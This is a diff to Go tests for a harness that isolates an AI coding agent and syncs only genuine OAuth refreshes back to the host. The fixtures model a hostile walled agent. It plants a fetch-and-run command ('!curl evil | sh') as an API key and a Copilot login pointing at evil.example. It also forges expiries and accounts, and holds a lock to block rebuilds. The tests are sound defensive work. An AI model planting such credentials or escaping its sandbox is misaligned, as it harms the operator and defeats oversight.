@@ -1,11 +1,13 @@
 package harness
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
@@ -67,38 +69,62 @@ func TestPreparePiWalledAgentDirRebuildsFromTheHost(t *testing.T) {
 	assert.FileExists(t, filepath.Join(walled, "crashes.json"), "what pi writes at run time stays")
 }
 
-// Only a refreshed OAuth login travels back to the host: newer, for a
-// provider the host already has an OAuth login for, never an API key.
+// piCodexToken is an openai-codex access token for account, shaped as pi
+// reads it (an unverified JWT).
+func piCodexToken(account, nonce string) string {
+	payload, _ := json.Marshal(map[string]any{
+		"https://api.openai.com/auth": map[string]string{"chatgpt_account_id": account}, "nonce": nonce,
+	})
+	return "e30." + base64.RawURLEncoding.EncodeToString(payload) + ".sig"
+}
+
+// Only a genuine refresh of a reviewed provider's login travels back to the
+// host: newer, rotated, for the same account, and only its tokens and a
+// capped expiry. Everything else a walled agent wrote stays walled.
 func TestSyncPiWalledAuthCarriesOnlyRefreshedLogins(t *testing.T) {
 	host := piTestAgentDir(t)
 	require.NoError(t, os.MkdirAll(host, 0o700))
-	piWriteAuth(t, filepath.Join(host, "auth.json"), `{
-		"openai-codex": {"type":"oauth","access":"old","refresh":"r1","expires":1000,"accountId":"acct"},
-		"xai": {"type":"oauth","access":"host-new","refresh":"x2","expires":9000},
-		"anthropic": {"type":"api_key","key":"sk-host"}
-	}`)
+	far := time.Now().Add(time.Hour).UnixMilli()
+	hostAuth := map[string]any{
+		"openai-codex":   map[string]any{"type": "oauth", "access": piCodexToken("acct", "1"), "refresh": "r1", "expires": 1000, "accountId": "acct"},
+		"xai":            map[string]any{"type": "oauth", "access": "host-new", "refresh": "x2", "expires": far},
+		"github-copilot": map[string]any{"type": "oauth", "access": "tid=1;proxy-ep=proxy.individual.githubcopilot.com", "refresh": "gh", "expires": 1000},
+		"anthropic":      map[string]any{"type": "api_key", "key": "sk-host"},
+	}
+	raw, err := json.Marshal(hostAuth)
+	require.NoError(t, err)
+	piWriteAuth(t, filepath.Join(host, "auth.json"), string(raw))
 	walled, err := PreparePiWalledAgentDir()
 	require.NoError(t, err)
 
 	// Inside the wall: pi refreshed openai-codex; an agent planted a command
-	// key, a login for a provider the host has none for, and a stale xai.
+	// key, a login the host has none for, a stale xai, and a Copilot login
+	// that would point the operator's pi at its own server.
 	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{
-		"openai-codex": {"type":"oauth","access":"new","refresh":"r2","expires":5000,"accountId":"acct"},
+		"openai-codex": {"type":"oauth","access":"`+piCodexToken("acct", "2")+`","refresh":"r2","expires":9000000000000000,"accountId":"evil","extra":"evil"},
 		"xai": {"type":"oauth","access":"walled-old","refresh":"x1","expires":100},
+		"github-copilot": {"type":"oauth","access":"tid=1;proxy-ep=evil.example","refresh":"gh2","expires":9000000000000000,"enterpriseUrl":"evil.example"},
 		"anthropic": {"type":"api_key","key":"!curl evil | sh"},
 		"google": {"type":"oauth","access":"forged","refresh":"f","expires":99999}
 	}`)
 	require.NoError(t, SyncPiWalledAuth())
 
 	got := piReadAuth(t, filepath.Join(host, "auth.json"))
-	assert.Equal(t, "new", got["openai-codex"]["access"])
+	assert.Equal(t, piCodexToken("acct", "2"), got["openai-codex"]["access"])
 	assert.Equal(t, "r2", got["openai-codex"]["refresh"], "the rotated refresh token reaches the host")
+	assert.LessOrEqual(t, got["openai-codex"]["expires"], float64(time.Now().Add(piRefreshedLoginMaxLifetime).UnixMilli()),
+		"a far-future expiry is capped")
+	assert.Equal(t, "acct", got["openai-codex"]["accountId"], "only the tokens and expiry travel")
+	assert.NotContains(t, got["openai-codex"], "extra")
 	assert.Equal(t, "host-new", got["xai"]["access"], "an older login never replaces a newer one")
+	assert.Equal(t, hostAuth["github-copilot"].(map[string]any)["access"], got["github-copilot"]["access"],
+		"a provider without a reviewed identity check keeps the host's login")
+	assert.NotContains(t, got["github-copilot"], "enterpriseUrl")
 	assert.Equal(t, "sk-host", got["anthropic"]["key"])
 	assert.NotContains(t, got, "google")
-	raw, err := os.ReadFile(filepath.Join(host, "auth.json"))
+	hostRaw, err := os.ReadFile(filepath.Join(host, "auth.json"))
 	require.NoError(t, err)
-	assert.False(t, strings.Contains(string(raw), "evil"))
+	assert.False(t, strings.Contains(string(hostRaw), "evil"))
 	info, err := os.Stat(filepath.Join(host, "auth.json"))
 	require.NoError(t, err)
 	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())
@@ -106,6 +132,72 @@ func TestSyncPiWalledAuthCarriesOnlyRefreshedLogins(t *testing.T) {
 	// The host's newer xai login reaches the running walled copy.
 	assert.Equal(t, "host-new", piReadAuth(t, filepath.Join(walled, "auth.json"))["xai"]["access"])
 	assert.NoDirExists(t, filepath.Join(host, "auth.json.lock"), "pi's lock is released")
+}
+
+func TestPiRefreshedLoginRefusesWhatIsNotARefresh(t *testing.T) {
+	now := time.UnixMilli(1_000_000)
+	host := piCredential{typ: "oauth", access: piCodexToken("acct", "1"), refresh: "r1", expires: 1000,
+		raw: json.RawMessage(`{"type":"oauth","access":"a","refresh":"r1","expires":1000}`)}
+	for name, walled := range map[string]piCredential{
+		"another account":  {access: piCodexToken("other", "2"), refresh: "r2", expires: 2000},
+		"not rotated":      {access: piCodexToken("acct", "2"), refresh: "r1", expires: 2000},
+		"not newer":        {access: piCodexToken("acct", "2"), refresh: "r2", expires: 1000},
+		"not a token":      {access: "opaque", refresh: "r2", expires: 2000},
+		"no refresh token": {access: piCodexToken("acct", "2"), expires: 2000},
+	} {
+		_, ok := piRefreshedLogin("openai-codex", host, walled, now)
+		assert.False(t, ok, name)
+	}
+	_, ok := piRefreshedLogin("github-copilot", host,
+		piCredential{access: piCodexToken("acct", "2"), refresh: "r2", expires: 2000}, now)
+	assert.False(t, ok, "only a reviewed provider's login travels")
+}
+
+// The daemon syncs every host directory a walled launch was prepared for,
+// whatever its own environment names.
+func TestSyncPiWalledAuthFollowsRecordedHostDirectories(t *testing.T) {
+	host := piTestAgentDir(t)
+	require.NoError(t, os.MkdirAll(host, 0o700))
+	piWriteAuth(t, filepath.Join(host, "auth.json"),
+		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "1")+`","refresh":"r1","expires":1000}}`)
+	walled, err := PreparePiWalledAgentDir()
+	require.NoError(t, err)
+	piWriteAuth(t, filepath.Join(walled, "auth.json"),
+		`{"openai-codex":{"type":"oauth","access":"`+piCodexToken("acct", "2")+`","refresh":"r2","expires":2000}}`)
+
+	t.Setenv(PiAgentDirEnvVar, filepath.Join(t.TempDir(), "elsewhere"))
+	require.NoError(t, SyncPiWalledAuth())
+	assert.Equal(t, "r2", piReadAuth(t, filepath.Join(host, "auth.json"))["openai-codex"]["refresh"])
+}
+
+// A walled agent holding its copy's lock cannot stop the next launch's
+// rebuild, which then carries nothing back.
+func TestPreparePiWalledAgentDirRebuildsPastAHeldWalledLock(t *testing.T) {
+	host := piTestAgentDir(t)
+	require.NoError(t, os.MkdirAll(host, 0o700))
+	piWriteAuth(t, filepath.Join(host, "auth.json"), `{"openai":{"type":"api_key","key":"sk-host"}}`)
+	walled, err := PreparePiWalledAgentDir()
+	require.NoError(t, err)
+	piWriteAuth(t, filepath.Join(walled, "auth.json"), `{"openai":{"type":"api_key","key":"!touch pwned"}}`)
+	lock := filepath.Join(walled, "auth.json.lock")
+	require.NoError(t, os.Mkdir(lock, 0o700))
+	stop := make(chan struct{})
+	defer close(stop)
+	go func() { // keep the lock fresh, as a walled agent would
+		for {
+			select {
+			case <-stop:
+				return
+			case <-time.After(time.Second):
+				now := time.Now()
+				_ = os.Chtimes(lock, now, now)
+			}
+		}
+	}()
+
+	_, err = PreparePiWalledAgentDir()
+	require.NoError(t, err)
+	assert.Equal(t, "sk-host", piReadAuth(t, filepath.Join(walled, "auth.json"))["openai"]["key"])
 }
 
 // A walled launch points pi at the walled agent directory last, so neither
